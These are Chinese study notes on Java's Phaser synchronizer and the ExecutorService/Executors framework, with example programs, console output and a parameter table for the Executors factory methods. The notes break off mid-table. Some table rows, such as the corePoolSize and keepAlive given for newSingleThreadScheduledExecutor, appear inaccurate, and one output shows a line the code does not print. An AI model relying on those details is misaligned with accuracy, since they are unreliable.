import practice.common.TaskFactory;import java.util.concurrent.Phaser;import java.util.concurrent.TimeUnit;import java.util.stream.IntStream;public class PhaserExample1 {    public static void main(String[] args) {        final Phaser phaser = new Phaser();        IntStream.rangeClosed(1, 5).boxed().map(i -&gt; phaser).forEach(Task::new);        System.out.println("【BEGIN-RegisteredParties】" + phaser.getRegisteredParties());        // 注册main线程        phaser.register();        // 到达并且等待前行        phaser.arriveAndAwaitAdvance();        // 等待所有线程全部到达隔离点之后执行        System.out.println("【END-RegisteredParties】" + phaser.getRegisteredParties());        System.out.println("【" + Thread.currentThread().getName() + " 】 all threads finished the work.");        System.out.println("【other work】");    }    private static class Task extends Thread {        private Phaser phaser;        public Task(Phaser phaser) {            this.phaser = phaser;            // 动态追加party            this.phaser.register();            this.start();        }        @Override        public void run() {            TaskFactory.spend(2, TimeUnit.SECONDS);            System.out.println(Thread.currentThread().getName() + "：finished and continue");            // 到达并且等待前行            this.phaser.arriveAndAwaitAdvance();        }    }}
输出结果
Thread-2：finished and continueThread-3：finished and continueThread-4：finished and continueThread-0：finished and continueThread-1：finished and continue【END-RegisteredParties】6【main 】 all threads finished the work.【other work】
重复使用计数器
public final int getPhase() ：获取已执行阶段数（从0开始，每执行一轮，计数器加1）
package practice.util.phaser;import practice.common.TaskFactory;import java.util.Random;import java.util.concurrent.Phaser;import java.util.stream.IntStream;public class PhaserExample2 {    private static final Random random = new Random(System.currentTimeMillis());    public static void main(String[] args) {        // 监控5个运动员（指定parties）        final Phaser phaser = new Phaser(5);        IntStream.rangeClosed(1, 5).boxed().map(i -&gt; phaser).forEach(Athlete::new);    }    public static class Athlete extends Thread {        // 运动员编号        private final Phaser phaser;        public Athlete(Phaser phaser) {            this.phaser = phaser;            this.start();        }        @Override        public void run() {            // step1: 游泳            monitor(0, "phaser.getPhase", phaser.getPhase());            actionDeal("swimming");            // 等待所有运动员完成游泳任务，继续执行            phaser.arriveAndAwaitAdvance();            // step2: 自行车            monitor(1, "phaser.getPhase", phaser.getPhase());            actionDeal("bicycle");            // 等待所有运动员完成自行车任务，继续执行            phaser.arriveAndAwaitAdvance();            // step3: 长跑            monitor(2, "phaser.getPhase", phaser.getPhase());            actionDeal("running");            // 等待所有运动员完成长跑任务，继续执行            phaser.arriveAndAwaitAdvance();            System.out.println("【" + Thread.currentThread().getName() + "】 finish all tasks.");        }        static void monitor(int index, String item, Object object) {            System.out.printf("\t【monitor】【%s】【%d】【%s】%s\n", Thread.currentThread().getName(), index, item, object);        }        static void actionDeal(String taskName) {            TaskFactory.spendSeconds(random.nextInt(6));            System.out.println("【" + Thread.currentThread().getName() + "】 finish  " + taskName + ".");        }    }}
执行结果
	【monitor】【Thread-0】【0】【phaser.getPhase】0	【monitor】【Thread-4】【0】【phaser.getPhase】0	【monitor】【Thread-3】【0】【phaser.getPhase】0	【monitor】【Thread-1】【0】【phaser.getPhase】0	【monitor】【Thread-2】【0】【phaser.getPhase】0【Thread-0】 finish  swimming.【Thread-2】 finish  swimming.【Thread-1】 finish  swimming.【Thread-3】 finish  swimming.【Thread-4】 finish  swimming.	【monitor】【Thread-2】【1】【phaser.getPhase】1	【monitor】【Thread-0】【1】【phaser.getPhase】1	【monitor】【Thread-3】【1】【phaser.getPhase】1	【monitor】【Thread-1】【1】【phaser.getPhase】1	【monitor】【Thread-4】【1】【phaser.getPhase】1【Thread-0】 finish  bicycle.【Thread-2】 finish  bicycle.【Thread-4】 finish  bicycle.【Thread-3】 finish  bicycle.【Thread-1】 finish  bicycle.	【monitor】【Thread-1】【2】【phaser.getPhase】2	【monitor】【Thread-3】【2】【phaser.getPhase】2	【monitor】【Thread-2】【2】【phaser.getPhase】2	【monitor】【Thread-4】【2】【phaser.getPhase】2	【monitor】【Thread-0】【2】【phaser.getPhase】2【Thread-0】 finish  running.【Thread-2】 finish  running.【Thread-3】 finish  running.【Thread-1】 finish  running.【Thread-4】 finish  running.【Thread-4】 finish all tasks.【Thread-2】 finish all tasks.【Thread-3】 finish all tasks.【Thread-1】 finish all tasks.【Thread-0】 finish all tasks.
减少计数器（动态销户）
需要注意：销户之后的return，否则仍然会参与后续流程的计数
import practice.common.TaskFactory;import java.util.Random;import java.util.concurrent.Phaser;import java.util.stream.IntStream;/** * Phaser 减少计数器（动态销户） */public class PhaserExample3 {    private static final Random random = new Random(System.currentTimeMillis());    public static void main(String[] args) {        // 监控5个运动员        final Phaser phaser = new Phaser(5);        IntStream.rangeClosed(1, 5).boxed().map(i -&gt; phaser).forEach(Athlete::new);    }    public static class Athlete extends Thread {        // 运动员编号        private final Phaser phaser;        public Athlete(Phaser phaser) {            this.phaser = phaser;            this.start();        }        @Override        public void run() {            // step1: 游泳            monitor(0, phaser);            actionDeal("swimming");            phaser.arriveAndAwaitAdvance();            // step2: 自行车            if (Thread.currentThread().getName().endsWith("2")) {                monitor(1, phaser);                actionFailed("bicycle");                // 运动员退出比赛（退出计数）                phaser.arriveAndDeregister();                // 退出计数之后，后续流程不在参与重新参与计数                return;            } else {                monitor(1, phaser);                actionDeal("bicycle");                phaser.arriveAndAwaitAdvance();            }            // step3: 长跑            monitor(2, phaser);            actionDeal("running");            phaser.arriveAndAwaitAdvance();            System.out.println("【" + Thread.currentThread().getName() + "】 finish all tasks.");        }        static void monitor(int index, Phaser phaser) {            String formatter = "\t【monitor】【%s】【%d】【%s】%s\n";            String threadName = Thread.currentThread().getName();            System.out.printf(formatter, threadName, index, "RegisteredParties", phaser.getRegisteredParties());        }        static void actionDeal(String taskName) {            TaskFactory.spendSeconds(random.nextInt(6));            System.out.println("【" + Thread.currentThread().getName() + "】 finish  " + taskName + ".");        }        static void actionFailed(String taskName) {            System.out.println("【" + Thread.currentThread().getName() + "】 failed  " + taskName + ".");        }    }}
输出结果
【monitor】【Thread-0】【0】【RegisteredParties】5	【monitor】【Thread-3】【0】【RegisteredParties】5	【monitor】【Thread-4】【0】【RegisteredParties】5	【monitor】【Thread-2】【0】【RegisteredParties】5	【monitor】【Thread-1】【0】【RegisteredParties】5【Thread-2】 finish  swimming.【Thread-3】 finish  swimming.【Thread-1】 finish  swimming.【Thread-0】 finish  swimming.【Thread-4】 finish  swimming.	【monitor】【Thread-4】【1】【RegisteredParties】5	【monitor】【Thread-0】【1】【RegisteredParties】5	【monitor】【Thread-3】【1】【RegisteredParties】5	【monitor】【Thread-1】【1】【RegisteredParties】5	【monitor】【Thread-2】【1】【RegisteredParties】5【Thread-2】 failed  bicycle.【Thread-2】 withdrew the game.【Thread-4】 finish  bicycle.【Thread-3】 finish  bicycle.【Thread-1】 finish  bicycle.【Thread-0】 finish  bicycle.	【monitor】【Thread-0】【2】【RegisteredParties】4	【monitor】【Thread-4】【2】【RegisteredParties】4【Thread-4】 finish  running.	【monitor】【Thread-3】【2】【RegisteredParties】4	【monitor】【Thread-1】【2】【RegisteredParties】4【Thread-0】 finish  running.【Thread-1】 finish  running.【Thread-3】 finish  running.【Thread-3】 finish all tasks.【Thread-0】 finish all tasks.【Thread-1】 finish all tasks.【Thread-4】 finish all tasks.
人为控制Phase的终结：onAdvance


使用方法：覆写onAdvance方法
final Phaser phaser = new Phaser(2) {  @Override  protected boolean onAdvance(int phase, int registeredParties) {    // return registeredParties == 0; 原始写法    return true;   }};


onAdvance 的返回结果直接设置为returen true ，则arriveAndAwaitAdvance不会阻塞等待所有的parties
package practice.util.phaser;import practice.common.TaskFactory;import java.util.concurrent.Phaser;import java.util.stream.IntStream;/** * 人为控制phase的终结：onAdvance */public class PhaserExample5 {    public static void main(String[] args) {        final Phaser phaser = new Phaser(2) {            @Override            protected boolean onAdvance(int phase, int registeredParties) {                // 无论执行情况，都默认，phase 执行结束。                return true;            }        };        IntStream.rangeClosed(1, 2).boxed().map(i -&gt; phaser).forEach(OnAdvanceTask::new);    }    static class OnAdvanceTask extends Thread {        private final Phaser phaser;        public OnAdvanceTask(Phaser phaser) {            this.phaser = phaser;            this.start();        }        @Override        public void run() {            System.out.println("【" + this.getName() + "】 arrived part one");            phaser.arriveAndAwaitAdvance();            System.out.println("【" + this.getName() + "】 passed part one");            TaskFactory.spendSeconds(1);            monitor(1, phaser);            if (this.getName().endsWith("1")) {                System.out.println("【" + this.getName() + "】 arrived part two");                // onAdvance 设置为true，arriveAndAwaitAdvance不会阻塞                // onAdvance 设置false/ 使用默认的onAdvance，Thread-1 会阻塞在此处                phaser.arriveAndAwaitAdvance();                System.out.println("【" + this.getName() + "】 passed part two");            }            monitor(2, phaser);            // onAdvance 设置false/ 使用默认的onAdvance，Thread-0 会阻塞在此处            phaser.arriveAndAwaitAdvance();            monitor(3, phaser);        }    }    static void monitor(int index, Phaser phaser) {        String template = "\t【%s】【monitor-%d】【%30s】%s\n";        String actionName = Thread.currentThread().getName();        System.out.printf(template, actionName, index, "phaser.getPhase", phaser.getPhase());        System.out.printf(template, actionName, index, "phaser.getRegisteredParties", phaser.getRegisteredParties());        System.out.printf(template, actionName, index, "phaser.getArrivedParties", phaser.getArrivedParties());        System.out.printf(template, actionName, index, "phaser.getUnarrivedParties", phaser.getUnarrivedParties());        System.out.printf(template, actionName, index, "phaser.isTerminated", phaser.isTerminated());    }}
输出结果
【Thread-0】 arrived part one【Thread-1】 arrived part one【Thread-1】 passed part one【Thread-0】 passed part one	【Thread-0】【monitor-1】【               phaser.getPhase】-2147483647	【Thread-1】【monitor-1】【               phaser.getPhase】-2147483647	【Thread-0】【monitor-1】【   phaser.getRegisteredParties】2	【Thread-1】【monitor-1】【   phaser.getRegisteredParties】2	【Thread-1】【monitor-1】【      phaser.getArrivedParties】2	【Thread-0】【monitor-1】【      phaser.getArrivedParties】2	【Thread-0】【monitor-1】【    phaser.getUnarrivedParties】0	【Thread-1】【monitor-1】【    phaser.getUnarrivedParties】0	【Thread-1】【monitor-1】【           phaser.isTerminated】true	【Thread-0】【monitor-1】【           phaser.isTerminated】true【Thread-1】 arrived part two	【Thread-0】【monitor-2】【               phaser.getPhase】-2147483647	【Thread-0】【monitor-2】【   phaser.getRegisteredParties】2	【Thread-0】【monitor-2】【      phaser.getArrivedParties】2	【Thread-0】【monitor-2】【    phaser.getUnarrivedParties】0	【Thread-0】【monitor-2】【           phaser.isTerminated】true	【Thread-0】【monitor-3】【               phaser.getPhase】-2147483647	【Thread-0】【monitor-3】【   phaser.getRegisteredParties】2	【Thread-0】【monitor-3】【      phaser.getArrivedParties】2	【Thread-0】【monitor-3】【    phaser.getUnarrivedParties】0	【Thread-0】【monitor-3】【           phaser.isTerminated】true【Thread-1】 passed part two	【Thread-1】【monitor-2】【               phaser.getPhase】-2147483647	【Thread-1】【monitor-2】【   phaser.getRegisteredParties】2	【Thread-1】【monitor-2】【      phaser.getArrivedParties】2	【Thread-1】【monitor-2】【    phaser.getUnarrivedParties】0	【Thread-1】【monitor-2】【           phaser.isTerminated】true	【Thread-1】【monitor-3】【               phaser.getPhase】-2147483647	【Thread-1】【monitor-3】【   phaser.getRegisteredParties】2	【Thread-1】【monitor-3】【      phaser.getArrivedParties】2	【Thread-1】【monitor-3】【    phaser.getUnarrivedParties】0	【Thread-1】【monitor-3】【           phaser.isTerminated】true


到达之后，不阻塞等待：arrive
public int arrive()
使用场景：仅==监控线程==关心任务完成，执行线程无需相互等待

import practice.common.TaskFactory;import java.util.concurrent.Phaser;import java.util.stream.IntStream;/** * @author: DH * @date: 2022/6/28 * @desc: */public class PhaserExample6 {    public static void main(String[] args) {        final Phaser phaser = new Phaser(3);        IntStream.rangeClosed(1, 2).boxed().map(i -&gt; phaser).forEach(ArriveTask::new);        // 此处main线程会阻塞，等待part one全部完成        phaser.arriveAndAwaitAdvance();        System.out.println("【" + Thread.currentThread().getName() + "】 part one all done");    }    static class ArriveTask extends Thread {        private final Phaser phaser;        public ArriveTask(Phaser phaser) {            this.phaser = phaser;            this.start();        }        @Override        public void run() {            TaskFactory.spendSecondsRandom(10, true, true);            monitor(1, phaser);            // parties 参与计数，但是不会阻塞等待            phaser.arrive();            System.out.println("【" + Thread.currentThread().getName() + "】 part one all done");            TaskFactory.spendSecondsRandom(2, true, true);        }    }    static void monitor(int index, Phaser phaser) {        String template = "\t【%s】【monitor-%d】【%30s】%s\n";        String actionName = Thread.currentThread().getName();        System.out.printf(template, actionName, index, "phaser.getPhase", phaser.getPhase());        System.out.printf(template, actionName, index, "phaser.getRegisteredParties", phaser.getRegisteredParties());        System.out.printf(template, actionName, index, "phaser.getArrivedParties", phaser.getArrivedParties());        System.out.printf(template, actionName, index, "phaser.getUnarrivedParties", phaser.getUnarrivedParties());        System.out.printf(template, actionName, index, "phaser.isTerminated", phaser.isTerminated());    }}
输出结果
	【Thread-1】【monitor-1】【               phaser.getPhase】0	【Thread-1】【monitor-1】【   phaser.getRegisteredParties】3	【Thread-1】【monitor-1】【      phaser.getArrivedParties】1	【Thread-1】【monitor-1】【    phaser.getUnarrivedParties】2	【Thread-1】【monitor-1】【           phaser.isTerminated】false【Thread-1】 part one all done	【Thread-0】【monitor-1】【               phaser.getPhase】0	【Thread-0】【monitor-1】【   phaser.getRegisteredParties】3	【Thread-0】【monitor-1】【      phaser.getArrivedParties】2	【Thread-0】【monitor-1】【    phaser.getUnarrivedParties】1	【Thread-0】【monitor-1】【           phaser.isTerminated】false【Thread-0】 part one all done【main】 part one all done
仅完成监控任务：awaitAdvance
awaitAdvance方法 不占用 party 数量，在所有parties全部完成后执行
/** * 仅完成监控任务：awaitAdvance */public class PhaserExample7 {    public static void main(String[] args) {        // 若将phaser的parties注册为3，程序会加入阻塞状态        final Phaser phaser = new Phaser(2);        actionArriveAndAwaitAdvance(phaser).start();        actionArriveAndAwaitAdvance(phaser).start();        new Thread(() -&gt; {            phaser.awaitAdvance(phaser.getPhase());            // 监听到指定phase的parties全部完成后执行            System.out.println("all parties finished：" + phaser.getPhase());        }).start();        TaskFactory.spendSeconds(12);        actionArriveAndAwaitAdvance(phaser).start();        actionArriveAndAwaitAdvance(phaser).start();        new Thread(() -&gt; {            phaser.awaitAdvance(phaser.getPhase());            // 监听到指定phase的parties全部完成后执行            System.out.println("all parties finished：" + phaser.getPhase());        }).start();        TaskFactory.spendSeconds(12);        System.out.println("\t【" + Thread.currentThread().getName() + "】" + " done");    }    private static Thread actionArriveAndAwaitAdvance(Phaser phaser) {        return new Thread(() -&gt; {            TaskFactory.spendSecondsRandom(5);            phaser.arriveAndAwaitAdvance();            TaskFactory.spendSeconds(1);            System.out.println("\t【" + Thread.currentThread().getName() + "】" + " done");        });    }}
输出结果
all parties finished：1	【Thread-0】 done	【Thread-1】 doneall parties finished：2	【Thread-4】 done	【Thread-3】 done

配合arrive使用

package practice.util.phaser;import practice.common.TaskFactory;import java.util.concurrent.Phaser;import java.util.stream.IntStream;/** * 测试 利用 {@link java.util.concurrent.Phaser#awaitAdvance} 监控所有party完成指定任务，才允许后续操作 */public class PhaserExample8 {    public static void main(String[] args) throws InterruptedException {        final Phaser phaser = new Phaser(3);        IntStream.rangeClosed(1, 2).boxed().map(i -&gt; phaser).forEach(AwaitAdvanceTask::new);        phaser.awaitAdvance(phaser.getPhase());        System.out.println("【" + Thread.currentThread().getName() + "】 all part one finished.");    }    static class AwaitAdvanceTask extends Thread {        private final Phaser phaser;        public AwaitAdvanceTask(Phaser phaser) {            this.phaser = phaser;            this.start();        }        @Override        public void run() {            // 需要监控完成的工作            actionDeal("part one", 2);            phaser.arrive();            // 非阻塞等待，完成其他工作            actionDeal("part two", 4);        }    }    static void actionDeal(String actionName, int seconds) {        System.out.println("【" + Thread.currentThread().getName() + "】 start " + actionName + ".");        TaskFactory.spendSeconds(seconds);        System.out.println("\t【" + Thread.currentThread().getName() + "】 finish  " + actionName + ".");    }}
输出结果
【Thread-1】 start part one.【Thread-0】 start part one.	【Thread-1】 finish  part one.【Thread-1】 start part two.	【Thread-0】 finish  part one.【Thread-0】 start part two.【main】 all part one finished.	【Thread-0】 finish  part two.	【Thread-1】 finish  part two.
打断/超时 终止：awaitAdvanceInterruptibly
等待此Phaser的阶段从给定的phase值前进，如果在等待期间被中断，则抛出 InterruptedException，或者如果当前phase不等于给定的phase值或此Phaser终止，则立即返回。
Phaser.awaitAdvanceInterruptibly(int) ，调用interrupt，抛出InterruptedException
Phaser.awaitAdvanceInterruptibly(int, long, TimeUnit): 调用interrupt/给定超时时间，抛出InterruptedException


不占用 party 数量，在所有parties全部完成后执行


打断了其中一个party，其他的 party 仍然能够继续执行
import practice.common.TaskFactory;import java.util.concurrent.Phaser;import java.util.stream.IntStream;public class PhaserExample9 {    final static int finishTime = 2;    // phase未结束，可以被打断，其他的 party 仍然能够继续执行    final static int waitTimeBeforeInterrupt = 1;    // phase已结束，不会抛出打断异常    //final static int waitTimeBeforeInterrupt = 4;    public static void main(String[] args) {        final Phaser phaser = new Phaser(2);        IntStream.rangeClosed(1, 2).forEach(i -&gt; {            new Thread(() -&gt; {                TaskFactory.spendSeconds(finishTime);                phaser.arriveAndAwaitAdvance();                System.out.println(Thread.currentThread().getName() + ": continue.");            }).start();        });        Thread thread = new Thread(() -&gt; {            try {                // 允许被打断的await                phaser.awaitAdvanceInterruptibly(phaser.getPhase());                System.out.println(Thread.currentThread().getName() + ": continue.");            } catch (InterruptedException e) {                e.printStackTrace();                System.out.println(Thread.currentThread().getName() + ": 未完成party数：" + phaser.getUnarrivedParties());            }        });        thread.start();        TaskFactory.spendSeconds(waitTimeBeforeInterrupt);        thread.interrupt();        System.out.println("=================================");    }}
输出结果
=================================Thread-2: 未完成party数：2java.lang.InterruptedException	at java.util.concurrent.Phaser.awaitAdvanceInterruptibly(Phaser.java:760)	at practice.util.phaser.PhaserExample9.lambda$main$2(PhaserExample9.java:28)	at java.lang.Thread.run(Thread.java:748)Thread-1: continue.Thread-0: continue.


强制销毁：forceTermination
强制此Phaser进入终止状态。注册方的数量不受影响。如果此Phaser是分层Phaser集的成员，则该集中的所有Phaser都将终止。如果此Phaser已终止，则此方法无效。
此方法可用于在一个或多个任务遇到意外异常后协调恢复。
import practice.common.TaskFactory;import java.util.concurrent.Phaser;import java.util.stream.IntStream;public class PhaserExample10 {    public static void main(String[] args) {        final Phaser phaser = new Phaser(2);        IntStream.rangeClosed(1, 1).forEach(i -&gt; {            new Thread(() -&gt; {                TaskFactory.spendSeconds(5);                phaser.arriveAndAwaitAdvance();                monitor(1, phaser);                System.out.println(Thread.currentThread().getName() + ": continue.");            }).start();        });        phaser.forceTermination();        monitor(1, phaser);        TaskFactory.spendSeconds(6);        System.out.println("&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;");        IntStream.rangeClosed(1, 2).forEach(i -&gt; {            new Thread(() -&gt; {                TaskFactory.spendSeconds(5);                phaser.arriveAndAwaitAdvance();                monitor(1, phaser);                System.out.println(Thread.currentThread().getName() + ": continue.");            }).start();        });        monitor(1, phaser);    }    static void monitor(int index, Phaser phaser) {        String template = "\t【%s】【monitor-%d】【%30s】%s\n";        String actionName = Thread.currentThread().getName();        System.out.printf(template, actionName, index, "phaser.getPhase", phaser.getPhase());        System.out.printf(template, actionName, index, "phaser.getRegisteredParties", phaser.getRegisteredParties());        System.out.printf(template, actionName, index, "phaser.getArrivedParties", phaser.getArrivedParties());        System.out.printf(template, actionName, index, "phaser.getUnarrivedParties", phaser.getUnarrivedParties());        System.out.printf(template, actionName, index, "phaser.isTerminated", phaser.isTerminated());    }}
输出结果
	【main】【monitor-1】【               phaser.getPhase】-2147483648	【main】【monitor-1】【   phaser.getRegisteredParties】2	【main】【monitor-1】【      phaser.getArrivedParties】0	【main】【monitor-1】【    phaser.getUnarrivedParties】2	【main】【monitor-1】【           phaser.isTerminated】true	【Thread-0】【monitor-1】【               phaser.getPhase】-2147483648	【Thread-0】【monitor-1】【   phaser.getRegisteredParties】2	【Thread-0】【monitor-1】【      phaser.getArrivedParties】0	【Thread-0】【monitor-1】【    phaser.getUnarrivedParties】2	【Thread-0】【monitor-1】【           phaser.isTerminated】trueThread-0: continue.&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;	【main】【monitor-1】【               phaser.getPhase】-2147483648	【main】【monitor-1】【   phaser.getRegisteredParties】2	【main】【monitor-1】【      phaser.getArrivedParties】0	【main】【monitor-1】【    phaser.getUnarrivedParties】2	【main】【monitor-1】【           phaser.isTerminated】true	【Thread-2】【monitor-1】【               phaser.getPhase】-2147483648	【Thread-2】【monitor-1】【   phaser.getRegisteredParties】2	【Thread-2】【monitor-1】【      phaser.getArrivedParties】0	【Thread-2】【monitor-1】【    phaser.getUnarrivedParties】2	【Thread-2】【monitor-1】【           phaser.isTerminated】trueThread-2: continue.	【Thread-1】【monitor-1】【               phaser.getPhase】-2147483648	【Thread-1】【monitor-1】【   phaser.getRegisteredParties】2	【Thread-1】【monitor-1】【      phaser.getArrivedParties】0	【Thread-1】【monitor-1】【    phaser.getUnarrivedParties】2	【Thread-1】【monitor-1】【           phaser.isTerminated】trueThread-1: continue.Process finished with exit code 0
[Toc]
Executor框架
ExecutorService接口
ExecutorService 继承树

ExecutorService的创建
创建一个什么样的ExecutorService的实例（即线程池）需要g根据具体应用场景而定，不过Java给我们提供了一个Executors工厂类，它可以帮助我们很方便的创建各种类型ExecutorService线程池，Executors一共可以创建下面这四类线程池

ThreadPoolExecutor 核心构造函数

  import java.util.concurrent.*;import java.util.stream.IntStream;/** * 测试ThreadPoolExecutor */public class ThreadPoolExecutorBuild {    public static void main(String[] args) {        ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) buildThreadPoolExecutor();        IntStream.rangeClosed(1, 50).forEach(index -&gt; threadPoolExecutor.submit(() -&gt; {            doAction(3);            monitorThreadPool(threadPoolExecutor, index);            System.out.println();            System.out.println();        }));        threadPoolExecutor.shutdown();    }    /**     * ThreadPoolExecutor 核心构造函数    */    private static ExecutorService buildThreadPoolExecutor() {        int corePoolSize = 2;        int maximumPoolSize = 10;        // 当线程数大于核心时，这是多余的空闲线程在终止前等待新任务的最长时间        long keepAliveTime = 1;        TimeUnit timeUnit = TimeUnit.SECONDS;        // 用于在任务完成之前保存任务的队列        BlockingQueue&lt;Runnable&gt; blockingQueue = new ArrayBlockingQueue&lt;&gt;(30);        // 线程创建工厂        ThreadFactory threadFactory = r -&gt; new Thread(r);        // 拒绝策略        RejectedExecutionHandler rejectedExecutionHandler = new ThreadPoolExecutor.AbortPolicy();        return new ThreadPoolExecutor(corePoolSize, maximumPoolSize, keepAliveTime, timeUnit, blockingQueue,                threadFactory, rejectedExecutionHandler);    }    private static void monitorThreadPool(ThreadPoolExecutor threadPoolExecutor, int index) {        System.out.println(index + "【getPoolSize】:" + threadPoolExecutor.getPoolSize());        System.out.println(index + "【getActiveCount】:" + threadPoolExecutor.getActiveCount());        System.out.println(index + "【getMaximumPoolSize】:" + threadPoolExecutor.getMaximumPoolSize());        System.out.println(index + "【getCompletedTaskCount】:" + threadPoolExecutor.getCompletedTaskCount());        System.out.println(index + "【getCorePoolSize】:" + threadPoolExecutor.getCorePoolSize());        System.out.println(index + "【getLargestPoolSize】:" + threadPoolExecutor.getLargestPoolSize());    }    private static void doAction(int seconds) {        try {            TimeUnit.SECONDS.sleep(seconds);        } catch (InterruptedException e) {            throw new RuntimeException(e);        }    }}
Executors只是一个工厂类，它所有的方法返回的都是ThreadPoolExecutor、ScheduledThreadPoolExecutor这两个类的实例
ExecutorService的执行
ExecutorService有如下几个执行方法：
- execute(Runnable)- submit(Runnable)- submit(Callable)- invokeAny(...)- invokeAll(...)

execute(Runnable)

这个方法接收一个Runnable实例，并且异步的执行，请看下面的实例：
ExecutorService executorService = Executors.newSingleThreadExecutor();executorService.execute(new Runnable() {  public void run() {     System.out.println("Asynchronous task");  }});executorService.shutdown();
这个方法有个问题，就是没有办法获知task的执行结果。

submit(Runnable)

submit(Runnable)和execute(Runnable)
区别是前者可以返回一个Future对象，通过返回的Future对象，我们可以检查提交的任务是否执行完毕
Future future = executorService.submit(new Runnable() {  public void run() {      System.out.println("Asynchronous task");  }});future.get();  //returns null if the task has finished correctly.
如果任务执行完成，future.get()方法会返回一个null。注意，future.get()方法会产生阻塞。

submit(Callable)

submit(Callable) 和submit(Runnable)类似，也会返回一个Future对象，但是除此之外，submit(Callable)接收的是一个Callable的实现，Callable接口中的call()方法有一个返回值，可以返回任务的执行结果，而Runnable接口中的run()方法是void的，没有返回值。
Future future = executorService.submit(new Callable(){	public Object call() throws Exception {    	System.out.println("Asynchronous Callable");    	return "Callable Result";	}});System.out.println("future.get() = " + future.get());
future.get()方法会返回Callable任务的执行结果。注意，future.get()方法会产生阻塞。

invokeAny(…)

invokeAny(…)方法接收的是一个Callable的集合，执行这个方法不会返回Future，但是会返回所有Callable任务中其中一个任务的执行结果。这个方法也无法保证返回的是哪个任务的执行结果，反正是其中的某一个
ExecutorService executorService = Executors.newSingleThreadExecutor();Set&lt;Callable&lt;String&gt;&gt; callables = new HashSet&lt;Callable&lt;String&gt;&gt;();callables.add(new Callable&lt;String&gt;() {	public String call() throws Exception { 	   return "Task 1";	}});callables.add(new Callable&lt;String&gt;() {	public String call() throws Exception {	    return "Task 2";	}});callables.add(new Callable&lt;String&gt;() {    public String call() throws Exception {    return "Task 3";	}});String result = executorService.invokeAny(callables);System.out.println("result = " + result);executorService.shutdown();
每次执行都会返回一个结果，并且返回的结果是变化的，可能会返回“Task2”也可是“Task1”或者其它。

nvokeAll(…)

invokeAll(…)与 invokeAny(…)类似也是接收一个Callable集合，但是前者执行之后会返回一个Future的List，其中对应着每个Callable任务执行后的Future对象
ExecutorService executorService = Executors.newSingleThreadExecutor();List&lt;Callable&lt;String&gt;&gt; callables = new ArrayList&lt;Callable&lt;String&gt;&gt;();callables.add(new Callable&lt;String&gt;() {public String call() throws Exception {    return "Task 1";}});callables.add(new Callable&lt;String&gt;() {    public String call() throws Exception {    return "Task 2";}});callables.add(new Callable&lt;String&gt;() {public String call() throws Exception {    return "Task 3";}});List&lt;Future&lt;String&gt;&gt; futures = executorService.invokeAll(callables);for(Future&lt;String&gt; future : futures){System.out.println("future.get = " + future.get());}executorService.shutdown();
List&lt;Callable&lt;String&gt;&gt; callables 返回的结果集是无序的。
ExecutorService的关闭
当我们使用完成ExecutorService之后应该关闭它，否则它里面的线程会一直处于运行状态。


void shutdown()


List shutdownNow()



Executors工具
利用：ThreadPoolExecutor(int corePoolSize, int maximumPoolSize,  long keepAliveTime, TimeUnit unit, BlockingQueue workQueue,  ThreadFactory threadFactory, RejectedExecutionHandler handler)



Executors模板方法
特性
corePoolSize
maximumPoolSize
keepAliveTime
unit
workQueue
threadFactory
handler




newFixedThreadPool(int  nThreads)
线程池中的线程不会被销毁
nThreads
nThreads
0L
TimeUnit.MILLISECONDS
 new LinkedBlockingQueue(Integer.MAX_VALUE)
Executors.defaultThreadFactory()
defaultHandler（new  AbortPolicy()）


newFixedThreadPool(int  nThreads, ThreadFactory threadFactory)
线程池中的线程不会被销毁
nThreads
nThreads
0L
TimeUnit.MILLISECONDS
new LinkedBlockingQueue(Integer.MAX_VALUE)
Executors.defaultThreadFactory()
defaultHandler（new  AbortPolicy()）


newSingleThreadExecutor
可以保留单线程需要执行的任务队列,并且将ThreadPoolExecutor中的方法屏蔽
1
1
0L
TimeUnit.MILLISECONDS
new LinkedBlockingQueue(Integer.MAX_VALUE)
Executors.defaultThreadFactory()
defaultHandler（new  AbortPolicy()）


newSingleThreadExecutor(ThreadFactory  threadFactory)
可以保留单线程需要执行的任务队列,并且将ThreadPoolExecutor中的方法屏蔽
1
1
0L
TimeUnit.MILLISECONDS
new LinkedBlockingQueue(Integer.MAX_VALUE)
threadFactory
defaultHandler（new  AbortPolicy()）


newCachedThreadPool()
每提交一个任务,创建一个线程
0
Integer.MAX_VALUE
60L
TimeUnit.SECONDS
new SynchronousQueue()
Executors.defaultThreadFactory()
defaultHandler（new  AbortPolicy()）


newCachedThreadPool(ThreadFactory  threadFactory)
每提交一个任务,创建一个线程
0
Integer.MAX_VALUE
60L
TimeUnit.SECONDS
new SynchronousQueue()
threadFactory
defaultHandler（new  AbortPolicy()）


newSingleThreadScheduledExecutor()

0
Integer.MAX_VALUE
60L
TimeUnit.SECONDS
new DelayedWorkQueue()
Executors.defaultThreadFactory()
defaultHandler（new  AbortPolicy()）


newSingleThreadScheduledExecutor(ThreadFactory  threadFactory)

0
Integer.MAX_VALUE
60L
TimeUnit.SECONDS
new DelayedWorkQueue()
threadFactory
defaultHandler（new  AbortPolicy()）


newScheduledThreadPool(int  corePoolSize)

corePoolSize
Integer.MAX_VALUE
0
TimeUnit.NANOSECONDS
new DelayedWorkQueue()
Executors.defaultThreadFactory()
defaultHandler（new  AbortPolicy()）


newScheduledThreadPool(int  corePoolSize, ThreadFactory threadFactory)

corePoolSize
Integer.MAX_VALUE
0
TimeUnit.NANOSECONDS
new DelayedWorkQueue()
threadFactory
defaultHandler（new  AbortPolicy()）



利用ForkJoinPool(int parallelism,  ForkJoinWorkerThreadFactory factory,  UncaughtExceptionHandler handler,  boolean asyncMode)



Executors模板方法
int parallelism
